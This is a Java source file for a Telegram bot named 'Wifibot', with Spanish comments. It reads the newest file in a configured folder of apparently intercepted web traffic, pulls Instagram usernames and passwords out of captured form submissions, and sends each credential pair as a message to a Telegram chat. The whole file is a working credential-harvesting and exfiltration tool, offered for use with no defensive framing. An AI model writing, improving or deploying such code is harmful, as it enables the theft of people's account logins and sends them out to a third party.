package main;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.LinkedList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

public class Wifibot extends TelegramLongPollingBot {
	
	private String rutaFicheros;
	
	public Wifibot() {
		rutaFicheros = readFile("files/ruta.txt");
	}
	
	@Override
	public String getBotUsername() {
		return "Wifibot";
	}
	
	@Override
	public String getBotToken() {
		return "";
	}
	
	@Override
	public void onUpdateReceived(Update arg0) {
		final String messageTextReceived = arg0.getMessage().getText();
		final long chatId = arg0.getMessage().getChatId();
		
		String filePath = findLatestFile();
		LinkedList<String[]> data = parseFile(filePath);
		int dataSize = data.size();
		
		if(dataSize == 0) {
			System.out.println("No se han encontrado páginas válidas.");
			return;
		}
		
		for(int i = 0; i < dataSize; ++i) {
			String[] temp = data.get(i);
			String messageTextSend = "Página web: " + temp[0] + "\n";
			messageTextSend += "Usuario: " + temp[1] + "\n";
			messageTextSend += "Contraseña: " + temp[2];
			SendMessage message = new SendMessage().setChatId(chatId).setText(messageTextSend);
			
			try {
				execute(message);
			} catch (TelegramApiException e) {
				e.printStackTrace();
			}
		}
	}
	
	private String findLatestFile() {
		File dir = new File(rutaFicheros);
		File[] list = dir.listFiles();
		if(list.length > 0) {
			File lastFileModified = list[0];
			for(int i = 1; i < list.length; ++i) {
				if(list[i].lastModified() > lastFileModified.lastModified()) {
					lastFileModified = list[i];
				}
			}
			try {
				return lastFileModified.getCanonicalPath();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return null;
	}
	
	// Leer y parsear fichero
	public LinkedList<String[]> parseFile(String path) {
		LinkedList<String[]> output = new LinkedList<String[]>(); // Web, user, password
		String lines[] = readFile(path).split("\\r?\\n");
		String customSeparator, customUsername, customPassword;
		
		for(int i = 0; i < lines.length; i += 2) {
			int indexL = lines[i].indexOf("(");
			int indexR = lines[i].indexOf(")");
			
			if(indexL == -1 || indexR == -1) {
				continue;
			}
			String web = lines[i].substring(indexL + 1, indexR);
			
			switch(web) {
			case "www.instagram.com":
				customSeparator = "&";
				customUsername = "username=";
				customPassword = "password=";
				break;
			default:
				System.out.println("Página web no válida: " + web + " (Línea " + (i + 1) + ")");
				continue;
			}
			
			String[] temp = new String[3]; // Web, user, password
			temp[0] = web;
			String[] args = lines[i + 1].split(customSeparator);
			
			for(int j = 0; j < args.length; ++j) {
				if(args[j].startsWith(customUsername)) {
					temp[1] = args[j].replaceFirst(customUsername, "");	
				} else if(args[j].startsWith(customPassword)) {
					temp[2] = args[j].replaceFirst(customPassword, "");
				}
			}
			
			if(temp[1] != null && temp[2] != null) {
				output.add(temp);
			}
			
		}
		
		return output;
	}
	
	public String readFile(String path) {
		File file = new File(path);
		FileInputStream fis = null;
		byte[] data = new byte[(int)file.length()];
		
		try {
			fis = new FileInputStream(file);
			fis.read(data);
			return new String(data);
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				if(fis != null) {
					fis.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return null;
	}
	// FIN Leer y parsear fichero
	
	
}
